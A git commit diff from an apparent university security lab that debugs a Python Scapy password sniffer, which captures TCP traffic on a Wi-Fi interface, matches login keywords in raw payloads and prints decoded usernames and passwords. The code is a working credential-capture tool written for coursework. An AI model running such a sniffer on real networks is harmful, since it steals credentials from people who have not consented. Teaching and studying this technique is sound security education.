1ba282adbdc67d433236110f9fcf2b1cc54a6a67
Micah Swindell <mjs87@students.uwf.edu>
2022-11-22 22:00:34 -0600

    Password sniffer now prints packet and user login data. Added snapshot of results.

--- lab_11/password_sniffer.py
+++ lab_11/password_sniffer.py
@@ -2,8 +2,9 @@ from scapy.all import *
 from urllib import parse
 import re
 
-iface = "Ethernet" # your computer's sniffing interface name
+iface = "Wi-Fi" # your computer's sniffing interface name
 
+"""Given a packet, this function uses key words and phrases to search for the username and password stored within a TCP packet."""
 def get_login_pass(body):
     user = None
     passwd = None
@@ -30,7 +31,8 @@ def get_login_pass(body):
         ## -------------
         return (user, passwd)
         ## -------------
-    
+
+"""Given an individual packet, this function checks if it has a TCP, IP, and Raw layer, then calls the get_login_pass function and prints the users username and password."""
 def pkt_parser(packet):
     try:
         ## if packet.haslayer is TCP and Raw and IP
@@ -43,22 +45,21 @@ def pkt_parser(packet):
                 ## print(parse.unquote(variable[1])) for password
         ## else:
             ## pass
-    ## --------------
-        if packet.haslayer(TCP) and packet.haslayer(IP) and packet.hastlayer(Raw):
+        ## --------------
+        if packet.haslayer(TCP) and packet.haslayer(IP) and packet.haslayer(Raw):
             body = str(packet[TCP].payload)
-            user_pass = get_login_pass(body)
-            if user_pass != None:
-                print(packet[TCP].payload)
-                print(parse.unquote(variable[0]))
-                print(parse.unquote(variable[1]))
+            user_pass = list(get_login_pass(body))
+            if user_pass:
+                print(body)
+                print(parse.unquote(user_pass[0]))
+                print(parse.unquote(user_pass[1]))
             else:
                 pass
-        else:
-            pass
     except:
         pass
     ## ---------------
 
+"""Calls the sniffer function on our given interface, calling the pkt_parser function on each packet."""
 def main():
     try:
         sniff(iface=iface, prn=pkt_parser, store=0)
@@ -66,5 +67,6 @@ def main():
     except KeyboardInterrupt:
         print('Exiting..')
         exit()
+
 if __name__ == "__main__":
     main()
